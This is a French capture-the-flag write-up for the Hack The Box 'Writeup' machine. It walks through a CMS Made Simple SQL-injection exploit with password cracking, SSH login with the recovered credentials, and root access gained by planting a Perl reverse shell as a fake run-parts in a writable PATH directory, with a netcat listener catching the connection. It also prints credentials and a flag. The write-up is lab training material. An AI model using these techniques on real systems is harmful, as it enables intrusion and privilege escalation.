---
layout: post
title: HTB - Write Up
subtitle: Hack The Box - Linux Machine 
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
gh-badge: [star]
tags: [HTB, Linux, CMS Made Simple, SQLi, scp, run-parts, reverse shell, perl]
comments: false
---

1 - User.txt

~~~
root@Host-001:~# nmap 10.10.10.138
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-10 21:01 CEST
Nmap scan report for 10.10.10.138
Host is up (0.060s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
~~~

Les ports 80 http et 22 ssh sont ouverts.

Consulter robots.txt: http://10.10.10.138/robots.txt

On trouve:

~~~
# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
~~~

Consulter http://10.10.10.138/writeup

Il y a plusieurs pages. On voit que l'url est http://10.10.10.138/writeup/index.php?page=writeup

On essaye avec page=flag sans résultat. On pense à du Local File Inclusion mais ne donne aucun résultat...

Wappalyser nous dis que la page utilise CMS Made Simple. La page d'admin est /admin. Ref: [https://hostpapasupport.com/log-log-cms-made-simple/](https://hostpapasupport.com/log-log-cms-made-simple/)

Essayons http://10.10.10.138/writeup/admin

Nous tombons sur une page d'authentification de type htaccess. On modifie le verbe GET mais pas possible de bypasser comme ça :( on essaye d'accéder à .htpasswd mais l'accès est interdit!

Il y a plusieurs exploits concernant CMSMS. Dans notre cas, un exploit intéressant est: [https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html](https://packetstormsecurity.com/files/152356/CMS-Made-Simple-SQL-Injection.html)

Enregistrer l'exploit 'cmsmadesimple22-sql.py' et le lancer:

~~~
root@kali:~/Desktop# python cmsmadesimple22-sql.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt
~~~

Résultat:

~~~
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
[+] Password cracked: raykayjay9
~~~

Ces credentials permettent de nous connecter au serveur via ssh:

~~~
root@Host-001:~# ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$ ls
user.txt
~~~

Nous avons accès au flag de l'usager. Passons à l'accès au compte root:

2 - Root.txt

Télécharger pspy: [https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s](https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s)

Envoyer le fichier sur le serveur:

~~~
root@kali:~/Desktop# scp pspy64s jkr@10.10.10.138:/home/jkr
jkr@10.10.10.138's password: 
pspy64s                                       100% 1129KB 172.5KB/s   00:06    
root@kali:~/Desktop#
~~~

Se connecter au serveur via SSH:

~~~
root@kali:~# ssh jkr@10.10.10.138
jkr@10.10.10.138's password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct  8 08:06:30 2019 from 10.10.14.14
jkr@writeup:~$ ls
pspy64s  user.txt
jkr@writeup:~$ chmod +x pspy64s 
jkr@writeup:~$ ./pspy64s

Résultat:
(...)
2019/10/08 10:56:01 CMD: UID=0    PID=2685   | /usr/sbin/CRON 
2019/10/08 10:56:01 CMD: UID=0    PID=2686   | /usr/sbin/CRON 
2019/10/08 10:56:01 CMD: UID=0    PID=2687   | /bin/sh -c /root/bin/cleanup.pl >/dev/null 2>&1 
2019/10/08 10:56:02 CMD: UID=0    PID=2688   | sshd: jkr [priv]  
2019/10/08 10:56:02 CMD: UID=0    PID=2689   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/10/08 10:56:02 CMD: UID=0    PID=2690   | run-parts --lsbsysinit /etc/update-motd.d 
2019/10/08 10:56:02 CMD: UID=0    PID=2691   | /bin/sh /etc/update-motd.d/10-uname 
2019/10/08 10:56:02 CMD: UID=0    PID=2692   | sshd: jkr [priv]  
(...)
~~~

On remarque que le compte root appel 'run-parts' et que le PATH de root est PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Ou est situé 'run-parts':

~~~
jkr@writeup:~$ which run-parts
/bin/run-parts
~~~

Les fichiers appelés par le shell le sont dans l'ordre du PATH. 'With a real shell the directories are searched in the order they are found in the path statement. So PATH="/a:/b/1:etc..." the /a will be looked at first.' Ref: [https://www.unix.com/shell-programming-and-scripting/95208-path-dircetory-search-order.html](https://www.unix.com/shell-programming-and-scripting/95208-path-dircetory-search-order.html)

Dans notre cas nous ne pouvons pas lire les dossiers /usr/local/sbin et /usr/local/bin mais nous pouvons écrire dedans:

~~~
jkr@writeup:~$ ls -la /usr/local
total 64
drwxrwsr-x 10 root staff  4096 Apr 19 04:11 .
drwxr-xr-x 10 root root   4096 Apr 19 04:11 ..
drwx-wsr-x  2 root staff 20480 Oct 10 15:09 bin
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 etc
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 games
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 include
drwxrwsr-x  4 root staff  4096 Apr 24 13:13 lib
lrwxrwxrwx  1 root staff     9 Apr 19 04:11 man -> share/man
drwx-wsr-x  2 root staff 12288 Oct 10 14:54 sbin
drwxrwsr-x  7 root staff  4096 Apr 19 04:30 share
drwxrwsr-x  2 root staff  4096 Apr 19 04:11 src
~~~

Tentons de créer un reverse-shell dans /usr/local/sbin. 

Nous utilisons ici perl-reverse-shell de pentestmonkey Ref: [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

Ce shell est disponible dans Kali Linux dans /usr/share/webshells/perl/
perl-reverse-shell.pl. Ref: [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

Modifier le shell en mettant son adresse IP (celle du tunnel tun0) et en spécifiant le port d'écoute (Ici 1234). Cf: Ref.

Envoyer le shell sur le serveur:

~~~
root@Host-001:~/Bureau# scp perl-reverse-shell.pl jkr@10.10.10.138:/home/jkr
jkr@10.10.10.138's password: 
perl-reverse-shell.pl                         100% 3714   152.7KB/s   00:00  
~~~

Ouvrir une session netcat et écouter sur le port enregisté dans perl-reverse-shell.pl

~~~
root@Host-001:~/Bureau# nc -v -n -l -p 1234
~~~

Sur le serveur, renommer et envoyer le shell dans /usr/local
~~~
jkr@writeup:~$ ls
perl-reverse-shell.pl  user.txt
jkr@writeup:~$ cp perl-reverse-shell.pl run-parts
jkr@writeup:~$ ls
perl-reverse-shell.pl  run-parts  user.txt
jkr@writeup:~$ mv run-parts /usr/local/sbin
~~~

Attendre et regarder la console ou netcat a été lancé:

~~~
root@Host-001:~/Bureau# nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [10.10.15.65] from (UNKNOWN) [10.10.10.138] 41160
 14:52:54 up 1 min,  3 users,  load average: 0.08, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jkr      pts/0    10.10.15.65      14:51   22.00s  0.03s  0.03s -bash
jkr      pts/1    10.10.14.30      14:51   19.00s  0.00s  0.00s -bash
jkr      pts/2    10.10.15.154     14:52    4.00s  0.00s  0.00s top
Linux writeup 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux
uid=0(root) gid=0(root) groups=0(root)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd root
# ls
bin
root.txt
# cat root.txt
eeba47f60b48ef92b734f9b6198d7226
~~~

**Poursuivez avec :** [Oneliner Shells](https://0xss0rz.github.io/2020-05-10-Oneliner-shells/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
